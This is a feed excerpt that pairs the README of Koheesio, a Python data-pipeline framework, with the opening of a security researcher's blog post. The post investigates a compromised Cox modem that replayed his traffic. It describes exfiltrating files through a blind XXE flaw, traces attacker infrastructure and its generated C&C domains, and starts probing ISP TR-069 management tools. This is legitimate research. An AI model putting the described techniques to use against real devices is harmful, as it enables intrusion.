<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Koheesio</h2><a id="user-content-koheesio" aria-label="Permalink: Koheesio" href="#koheesio"></a></p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/Nike-Inc/koheesio/main/docs/assets/logo_koheesio.svg"><img src="https://raw.githubusercontent.com/Nike-Inc/koheesio/main/docs/assets/logo_koheesio.svg" alt="Koheesio logo" width="500"></a>
</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>CI/CD</td>
<td><a href="https://github.com/Nike-Inc/koheesio/actions/workflows/test.yml"><img src="https://github.com/Nike-Inc/koheesio/actions/workflows/test.yml/badge.svg" alt="CI - Test"></a> <a href="https://github.com/Nike-Inc/koheesio/actions/workflows/release.yml"><img src="https://github.com/Nike-Inc/koheesio/actions/workflows/release.yml/badge.svg" alt="CD - Release Koheesio"></a></td>
</tr>
<tr>
<td>Package</td>
<td><a href="https://pypi.org/project/koheesio/" rel="nofollow"><img src="https://camo.githubusercontent.com/fea8b211ac85787d156ca1ec6e2019c06414f0a9391c377f35ffaee98bad9603/68747470733a2f2f696d672e736869656c64732e696f2f707970692f762f6b6f68656573696f2e7376673f6c6f676f3d70797069266c6162656c3d50795049266c6f676f436f6c6f723d676f6c64" alt="PyPI - Version" data-canonical-src="https://img.shields.io/pypi/v/koheesio.svg?logo=pypi&amp;label=PyPI&amp;logoColor=gold"></a> <a href="https://pypi.org/project/koheesio/" rel="nofollow"><img src="https://camo.githubusercontent.com/d54efd240909933c8ec591c4a97a4a84dd3e7d1222c0be553856963ebb67f4e0/68747470733a2f2f696d672e736869656c64732e696f2f707970692f707976657273696f6e732f6b6f68656573696f2e7376673f6c6f676f3d707974686f6e266c6162656c3d507974686f6e266c6f676f436f6c6f723d676f6c64" alt="PyPI - Python Version" data-canonical-src="https://img.shields.io/pypi/pyversions/koheesio.svg?logo=python&amp;label=Python&amp;logoColor=gold"></a> <a href="https://pypi.org/project/koheesio/" rel="nofollow"><img src="https://camo.githubusercontent.com/1b118ecbda4ba4cbac01779e8ce45cf5c06605077cf9bfaeb496e5f6c42f2562/68747470733a2f2f696d672e736869656c64732e696f2f707970692f646d2f6b6f68656573696f3f636f6c6f723d626c7565266c6162656c3d496e7374616c6c73266c6f676f3d70797069266c6f676f436f6c6f723d676f6c64" alt="PyPI - Downloads" data-canonical-src="https://img.shields.io/pypi/dm/koheesio?color=blue&amp;label=Installs&amp;logo=pypi&amp;logoColor=gold"></a></td>
</tr>
<tr>
<td>Meta</td>
<td><a href="https://github.com/pypa/hatch"><img src="https://camo.githubusercontent.com/913a9419bb59f99a8378258a38e935948c906e1565b3a8a41fb8e1219d7bb680/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2546302539462541352539412d48617463682d3430353162352e737667" alt="Hatch project" data-canonical-src="https://img.shields.io/badge/%F0%9F%A5%9A-Hatch-4051b5.svg"></a> <a href="https://github.com/astral-sh/ruff"><img src="https://camo.githubusercontent.com/18c26428c337f9d641fa09b629a3a03b514e8ac84b57974a0ed7d1b38e14e060/68747470733a2f2f696d672e736869656c64732e696f2f656e64706f696e743f75726c3d68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f61737472616c2d73682f727566662f6d61696e2f6173736574732f62616467652f76322e6a736f6e" alt="linting - Ruff" data-canonical-src="https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json"></a> <a href="https://github.com/python/mypy"><img src="https://camo.githubusercontent.com/da30df6e7fd8b77624a714a0abf60e9265b8ed07f842a3ab7dc7cbbcef581288/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f74797065732d4d7970792d626c75652e737667" alt="types - Mypy" data-canonical-src="https://img.shields.io/badge/types-Mypy-blue.svg"></a> <a href="https://numpydoc.readthedocs.io/en/latest/format.html" rel="nofollow"><img src="https://camo.githubusercontent.com/3b43ff97d2d36f56fd411cc1a5e131ec615ca816ed92c482556e778480ea3543/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f646f63737472696e672d6e756d7079646f632d626c7565" alt="docstring - numpydoc" data-canonical-src="https://img.shields.io/badge/docstring-numpydoc-blue"></a> <a href="https://github.com/psf/black"><img src="https://camo.githubusercontent.com/7d770c433d6198d89f8c1e2f187b904a9721d176259d0e97157337741cc8e837/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f636f64652532307374796c652d626c61636b2d3030303030302e737667" alt="code style - black" data-canonical-src="https://img.shields.io/badge/code%20style-black-000000.svg"></a> <a href="https://github.com/Nike-Inc/koheesio/blob/main/LICENSE.txt"><img src="https://camo.githubusercontent.com/3b6292ba7b832b6b3fda8c18eaca3c4351d1251ddaf70167664a2256b5d104f1/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f4e696b652d496e632f6b6f68656573696f" alt="License - Apache 2.0" data-canonical-src="https://img.shields.io/github/license/Nike-Inc/koheesio"></a></td>
</tr>
</tbody>
</table>
<p dir="auto">Koheesio, named after the Finnish word for cohesion, is a robust Python framework for building efficient data pipelines.
It promotes modularity and collaboration, enabling the creation of complex pipelines from simple, reusable components.</p>
<p dir="auto">The framework is versatile, aiming to support multiple implementations and working seamlessly with various data
processing libraries or frameworks. This ensures that Koheesio can handle any data processing task, regardless of the
underlying technology or data scale.</p>
<p dir="auto">Koheesio uses <a href="https://github.com/Nike-Inc/koheesio/blob/main/docs/includes/glossary.md#pydantic">Pydantic</a> for strong typing, data validation, and settings management, ensuring a high level of type
safety and structured configurations within pipeline components.</p>
<p dir="auto">Koheesio's goal is to ensure predictable pipeline execution through a solid foundation of well-tested code and a rich
set of features, making it an excellent choice for developers and organizations seeking to build robust and adaptable
Data Pipelines.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">What sets Koheesio apart from other libraries?"</h2><a id="user-content-what-sets-koheesio-apart-from-other-libraries" aria-label="Permalink: What sets Koheesio apart from other libraries?&quot;" href="#what-sets-koheesio-apart-from-other-libraries"></a></p>
<p dir="auto">Koheesio encapsulates years of data engineering expertise, fostering a collaborative and innovative community. While
similar libraries exist, Koheesio's focus on data pipelines, integration with PySpark, and specific design for tasks
like data transformation, ETL jobs, data validation, and large-scale data processing sets it apart.</p>
<p dir="auto">Koheesio aims to provide a rich set of features including readers, writers, and transformations for any type of Data
processing. Koheesio is not in competition with other libraries. Its aim is to offer wide-ranging support and focus
on utility in a multitude of scenarios. Our preference is for integration, not competition...</p>
<p dir="auto">We invite contributions from all, promoting collaboration and innovation in the data engineering community.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Koheesio Core Components</h2><a id="user-content-koheesio-core-components" aria-label="Permalink: Koheesio Core Components" href="#koheesio-core-components"></a></p>
<p dir="auto">Here are the key components included in Koheesio:</p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Step</strong>: This is the fundamental unit of work in Koheesio. It represents a single operation in a data pipeline,
taking in inputs and producing outputs.</p>
<div data-snippet-clipboard-copy-content="┌─────────┐        ┌──────────────────┐        ┌──────────┐
│ Input 1 │───────▶│                  ├───────▶│ Output 1 │
└─────────┘        │                  │        └────√─────┘
                   │                  │
┌─────────┐        │                  │        ┌──────────┐
│ Input 2 │───────▶│       Step       │───────▶│ Output 2 │
└─────────┘        │                  │        └──────────┘
                   │                  │
┌─────────┐        │                  │        ┌──────────┐
│ Input 3 │───────▶│                  ├───────▶│ Output 3 │
└─────────┘        └──────────────────┘        └──────────┘"><pre lang="text"><code>┌─────────┐        ┌──────────────────┐        ┌──────────┐
│ Input 1 │───────▶│                  ├───────▶│ Output 1 │
└─────────┘        │                  │        └────√─────┘
                   │                  │
┌─────────┐        │                  │        ┌──────────┐
│ Input 2 │───────▶│       Step       │───────▶│ Output 2 │
└─────────┘        │                  │        └──────────┘
                   │                  │
┌─────────┐        │                  │        ┌──────────┐
│ Input 3 │───────▶│                  ├───────▶│ Output 3 │
└─────────┘        └──────────────────┘        └──────────┘
</code></pre></div>
</li>
<li>
<p dir="auto"><strong>Context</strong>: This is a configuration class used to set up the environment for a Task. It can be used to share
variables across tasks and adapt the behavior of a Task based on its environment.</p>
</li>
<li>
<p dir="auto"><strong>Logger</strong>: This is a class for logging messages at different levels.</p>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<p dir="auto">You can install Koheesio using either pip or poetry.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Using Pip</h3><a id="user-content-using-pip" aria-label="Permalink: Using Pip" href="#using-pip"></a></p>
<p dir="auto">To install Koheesio using pip, run the following command in your terminal:</p>

<p dir="auto"><h3 tabindex="-1" dir="auto">Using Hatch</h3><a id="user-content-using-hatch" aria-label="Permalink: Using Hatch" href="#using-hatch"></a></p>
<p dir="auto">If you're using Hatch for package management, you can add Koheesio to your project by simply adding koheesio to your
<code>pyproject.toml</code>.</p>
<div dir="auto" data-snippet-clipboard-copy-content="[dependencies]
koheesio = &quot;<version>&quot;"><pre>[<span>dependencies</span>]
<span>koheesio</span> = <span><span>"</span>&lt;version&gt;<span>"</span></span></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Using Poetry</h3><a id="user-content-using-poetry" aria-label="Permalink: Using Poetry" href="#using-poetry"></a></p>
<p dir="auto">If you're using poetry for package management, you can add Koheesio to your project with the following command:</p>

<p dir="auto">or add the following line to your <code>pyproject.toml</code> (under <code>[tool.poetry.dependencies]</code>), making sure to replace <code>...</code> with the version you want to have installed:</p>
<div dir="auto" data-snippet-clipboard-copy-content="koheesio = {version = &quot;...&quot;}"><pre><span>koheesio</span> = {<span>version</span> = <span><span>"</span>...<span>"</span></span>}</pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Features</h3><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<p dir="auto">Koheesio also provides some additional features that can be useful in certain scenarios. These include:</p>
<ul dir="auto">
<li><strong>Spark Expectations</strong>: Available through the <code>koheesio.steps.integration.spark.dq.spark_expectations</code> module;
<ul dir="auto">
<li>Installable through the <code>se</code> extra.</li>
<li>SE Provides Data Quality checks for Spark DataFrames. For more information, refer to the <a href="https://engineering.nike.com/spark-expectations" rel="nofollow">Spark Expectations docs</a>.</li>
</ul>
</li>
</ul>
<ul dir="auto">
<li>
<p dir="auto"><strong>Box</strong>: Available through the <code>koheesio.steps.integration.box</code> module</p>
<ul dir="auto">
<li>Installable through the <code>box</code> extra.</li>
<li>Box is a cloud content management and file sharing service for businesses.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>SFTP</strong>: Available through the <code>koheesio.steps.integration.spark.sftp</code> module;</p>
<ul dir="auto">
<li>Installable through the <code>sftp</code> extra.</li>
<li>SFTP is a network protocol used for secure file transfer over a secure shell.</li>
</ul>
</li>
</ul>
<blockquote>
<p dir="auto"><strong>Note:</strong><br>
Some of the steps require extra dependencies. See the <a href="#features">Features</a> section for additional info.<br>
Extras can be done by adding <code>features=['name_of_the_extra']</code> to the toml entry mentioned above</p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">How to Contribute</h3><a id="user-content-how-to-contribute" aria-label="Permalink: How to Contribute" href="#how-to-contribute"></a></p>
<p dir="auto">We welcome contributions to our project! Here's a brief overview of our development process:</p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Code Standards</strong>: We use <code>pylint</code>, <code>black</code>, and <code>mypy</code> to maintain code standards. Please ensure your code passes these checks by running <code>make check</code>. No errors or warnings should be reported by the linter before you submit a pull request.</p>
</li>
<li>
<p dir="auto"><strong>Testing</strong>: We use <code>pytest</code> for testing. Run the tests with <code>make test</code> and ensure all tests pass before submitting a pull request.</p>
</li>
<li>
<p dir="auto"><strong>Release Process</strong>: We aim for frequent releases. Typically when we have a new feature or bugfix, a developer with
admin rights will create a new release on GitHub and publish the new version to PyPI.</p>
</li>
</ul>
<p dir="auto">For more detailed information, please refer to our <a href="https://github.com/Nike-Inc/koheesio/blob/main/docs/contribute.md">contribution guidelines</a>. We also adhere to
<a href="https://github.com/Nike-Inc/nike-inc.github.io/blob/master/CONDUCT.md">Nike's Code of Conduct</a> and <a href="https://www.clahub.com/agreements/Nike-Inc/fastbreak" rel="nofollow">Nike's Individual Contributor License Agreement</a>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Additional Resources</h3><a id="user-content-additional-resources" aria-label="Permalink: Additional Resources" href="#additional-resources"></a></p>
<ul dir="auto">
<li><a href="https://help.github.com/">General GitHub documentation</a></li>
<li><a href="https://help.github.com/send-pull-requests/">GitHub pull request documentation</a></li>
<li><a href="https://nike-inc.github.io/" rel="nofollow">Nike OSS</a></li>
</ul>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Hacking millions of modems and investigating who hacked my modem (827 pts)]]></title>
            <link>https://samcurry.net/hacking-millions-of-modems</link>
            <guid>40570781</guid>
            <pubDate>Tue, 04 Jun 2024 04:46:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://samcurry.net/hacking-millions-of-modems">https://samcurry.net/hacking-millions-of-modems</a>, See on <a href="https://news.ycombinator.com/item?id=40570781">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h2 id="introduction">Introduction</h2>
<p>Two years ago, something very strange happened to me while working from my home network. I was exploiting a blind XXE vulnerability that required an external HTTP server to smuggle out files, so I spun up an AWS box and ran a simple Python webserver to receive the traffic from the vulnerable server:</p>
<pre><code>python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</code></pre>
<p>Once the webserver was running, I sent a cURL request from my home computer to make sure that it could receive external HTTP requests:</p>
<pre><code>curl "http://54.156.88.125:8000/test123"
</code></pre>
<p>Just a few seconds later, I saw the following log:</p>
<pre><code>98.161.24.100 - [16:32:12] "GET /test123 HTTP/1.1"
</code></pre>
<p>Perfect, this meant that I was able to receive network traffic on the box. Everything seemed good to go, but right as I switched back to exploiting the vulnerability, something very unexpected appeared in my log file:</p>
<pre><code>98.161.24.100 - [16:32:12] "GET /test123 HTTP/1.1"
159.65.76.209 - [16:32:22] "GET /test123 HTTP/1.1"
</code></pre>
<p>An unknown IP address had replayed the exact same HTTP request just 10 seconds later.</p>
<p>"Wow, that’s seriously weird," I thought. Somewhere, between my home network and the AWS box, someone had intercepted and replayed my HTTP traffic. This traffic should not be accessible. There is no intermediary between these two systems who should be seeing this. My immediate thought was that my computer had been hacked and that the hacker was actively monitoring my traffic.</p>
<p>To check if the same behavior occured on a different device, I pulled out my iPhone and typed in the URL into Safari. I sent the request, then peaked at my log file:</p>
<pre><code>98.161.24.100 - [16:34:04] "GET /uhhhh HTTP/1.1"
159.65.76.209 - [16:34:16] "GET /uhhhh HTTP/1.1"
</code></pre>
<p>The same unknown IP address had intercepted and replayed both HTTP requests from my computer and iPhone. Somehow, someone was intercepting and replaying the web traffic from likely every single device on my home network.</p>
<p>Panicked, I spun up a new AWS box running Nginx to make sure that the original instance hadn't been compromised somehow.</p>
<pre><code>sudo service nginx start
tail -f /var/log/nginx/access.log
</code></pre>
<p>I opened the URL once again from my iPhone and saw the exact same logs:</p>
<pre><code>98.161.24.100 - [16:44:04] "GET /whatisgoingon1234 HTTP/1.1"
159.65.76.209 - [16:44:12] "GET /whatisgoingon1234 HTTP/1.1"
</code></pre>
<p>Through what could only be my ISP, modem, or AWS being compromised, someone was intercepting and replaying my HTTP traffic immediately after I'd sent it. To eliminate the absurd idea that AWS had been compromised, I spun up a box on GCP instead and observed the same unknown IP address replaying my HTTP requests. It wasn’t AWS.</p>
<p>The only real option left was that my modem had been hacked, but who was the attacker? I queried the owner of the IP address and found that it belonged to DigitalOcean. Strange. That definitely didn't belong to my ISP.</p>
<h2 id="who-are-you-1596576209">Who are you, 159.65.76.209?</h2>
<p>To kick off an investigation, I sent the IP address to some friends who worked for threat intelligence companies. They sent me a link to the VirusTotal listing for the IP address which detailed all of the domains which resolved to the IP address over the past few years.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Out of the last 5 domains that were tied to the IP address, 3 were phishing websites, and 2 were what appeared to be mail servers. The following domains all at one point in time resolved to the DigitalOcean IP address:</p>
<pre><code>regional.adidas.com.py (2019/11/26)
isglatam.online (2019/12/08)
isglatam.tk (2020/11/11)
mx12.limit742921.tokyo (2021/08/08)
mx12.jingoism44769.xyz (2022/04/12)
</code></pre>
<p>Two of the domains associated with the 159.65.76.209 IP address were <code>isglatam.online</code> and <code>isglatam.tk</code>. These were both at one point in time phishing websites for <code>isglatam.com</code>, a South American cybersecurity company.</p>
<p>After visiting the real ISG Latam website, we learned that they are based out of Paraguay and partnered with Crowdstrike, AppGate, Acunetix, DarkTrace, and ForcePoint. From a 10 minute read of everything, it appeared that the people who were intercepting my traffic had tried to phish ISG Latam using the same IP address.</p>
<h2 id="hackers-hacking-hackers">Hackers Hacking Hackers?</h2>
<p>Now this was odd. The IP address, just one year prior, was being used to host phishing infrastructure that targeted a South American cybersecurity company. Assuming that they have been in control of this IP address for 3 years, it would mean that they have used it for at least 2 different phishing campaigns and what appeared to be a C&amp;C server for router malware?</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Through URLscan, I learned that the <code>isglatam.online</code> and <code>isglatam.tk</code> websites were hosting generic BeEF phishing sites that can historically be seen <a href="https://urlscan.io/result/52459337-0f2d-4b26-859f-4a6f4eafa6dd#transactions">here</a>.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>The signature of the attacker was super interesting, because they were doing a lot of different malicious activities from the same box and apparently had not gotten suspended in over 3 years. It was really hard to piece together their intent with the Adidas, ISG Latam, and modem hacking thing all coming from the same IP address. There was a chance that the IP had rotated between different owners over the years, but it didn't seem likely as the gaps in between everything were long and it was unlikely that it was immediately reassigned to another malicious party.</p>
<p>Realizing that the infected device was still running, I walked over, unplugged it, and placed it into a cardboard box.</p>
<h2 id="handing-over-evidence">Handing Over Evidence</h2>
<p>The modem that I had been using was the Cox Panoramic Wifi gateway. After learning that it was likely compromised, I went to the local Cox store to show them my device and ask for a new one.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>The one issue with this request was that in order for me to receive a new modem, I had to hand over the old one. Sadly, it wasn't actually my property — I was only <em>renting</em> it from the ISP. I explained to the employee how I wanted to keep and reverse engineer the device. Their eyes shot up a little bit. They were much less enthusiastic about giving it back to me.</p>
<p>“There’s no way I can keep it?” I asked. “No, we need to take your old one to give you a new one,” the ISP representative said. There was no budging. As much as I wanted to take it apart, dump the firmware, and see if there was any trace of whatever potentially compromised it, I had already passed the device off to the employee. I took my new device and left the store, disappointed that I wasn’t able to do anything more with it.</p>
<p>After setting up the new modem, the previous behavior completely stopped. My traffic was no longer being replayed. There was no "other IP" in the logs. Everything seemed fixed.</p>
<p>With a bit of dissapointment I concluded that the modem I no longer had access to was what had been compromised. Since I’d handed it over to the ISP and replaced the device, there wasn’t anything more that I could investigate besides maybe seeing if my computer had gotten hacked.</p>
<p>I gave up trying to figure it out. At least for the time being.</p>
<h2 id="three-years-later">Three Years Later</h2>
<p>In early 2024, almost three years later, I was on vacation with some friends who also worked in cybersecurity. We were having a conversation over dinner when I explained the story to them. Curious to learn more, they asked me for all of the details and thought it’d be fun to run their own investigation.</p>
<p>The first thing that caught their attention (having worked on more malware analysis a lot more than I had) was the format of the two mail server domains (<code>limit742921.tokyo</code> and <code>jingoism44769.xyz</code>). They pulled the IP address of the <code>mx1</code> subdomain for <code>limit742921.tokyo</code> and then ran a reverse IP search on all domains that had at one point in time pointed to that same IP address. There were over 1,000 domains that all followed the exact same pattern...</p>
<pre><code><span>{</span><span>"rrname"</span><span>:</span><span>"acquire543225.biz."</span><span>,</span><span>"rrtype"</span><span>:</span><span>"A"</span><span>,</span><span>"rdata"</span><span>:</span><span>"153.127.55.212"</span><span>}</span>
<span>{</span><span>"rrname"</span><span>:</span><span>"battery935904.biz."</span><span>,</span><span>"rrtype"</span><span>:</span><span>"A"</span><span>,</span><span>"rdata"</span><span>:</span><span>"153.127.55.212"</span><span>}</span>
<span>{</span><span>"rrname"</span><span>:</span><span>"grocery634272.biz."</span><span>,</span><span>"rrtype"</span><span>:</span><span>"A"</span><span>,</span><span>"rdata"</span><span>:</span><span>"153.127.55.212"</span><span>}</span>
<span>{</span><span>"rrname"</span><span>:</span><span>"seventy688181.biz."</span><span>,</span><span>"rrtype"</span><span>:</span><span>"A"</span><span>,</span><span>"rdata"</span><span>:</span><span>"153.127.55.212"</span><span>}</span>
</code></pre>
<p>Every single domain that was registered by the discovered IP address used the same naming convention:</p>
<pre><code>[word][6 numbers].[TLD]
</code></pre>
<p>Due to the mass-number of domains and algorithmic structure of the registered address, this appeared to be a domain generation algorithm used by malware operators to rotate the resolving address for the C&amp;C server for the purpose of obfuscation. There was a good chance that the IP address replaying my traffic was a C&amp;C server, and the two domains which I thought were mail servers were actually algorithmically generated pointers to the C&amp;C server.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fjn9s1Fl.jpeg&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Something disappointing was that all of these domains were historical; the last one seen was registered on March 17, 2023. None of the hosts resolved to anything anymore, and we couldn’t seem to identify anything similar being registered to the same IP address.</p>
<p>Given that my new modem was the same model that had been compromised, I was curious if the attacker had found a way back in. From a quick Google search I’d learned that there were no public vulnerabilities for the model of modem that I had (even though it was now 3 years later) so if there was an exploit, they were doing a great job keeping it private.</p>
<p>The other option that seemed more-and-more likely was that they had exploited something outside of a generic router exploit. I was super curious to investigate this and try to brainstorm ways that my device could’ve been compromised.</p>
<h2 id="targeting-rest-apis-using-the-tr-069-protocol">Targeting REST APIs using the TR-069 Protocol</h2>
<p>After getting back home, a close friend had asked if I’d be able to help him move furniture into his new house. What this also meant was helping him transfer over his Cox modem. After connecting his device to the fiber line, I went ahead and called the ISP support and asked if they’d be able to push out an update to allow the device to work in the new location. The agent confirmed they could remotely update the device settings, including changing the WiFi password and viewing connected devices.</p>
<p>The ability of support agents to control devices really interested me, especially since they could update pretty much anything on the device. This extensive access was facilitated by a protocol known as TR-069, implemented in 2004, which allowed ISPs to manage devices within their own network via port 7547. This protocol had already been the subject of a few great DEF CON talks and wasn’t externally exposed, so I wasn’t super interested in bug hunting the protocol itself. What I was interested in, however, were the tools that the support agent was using to manage the device.</p>
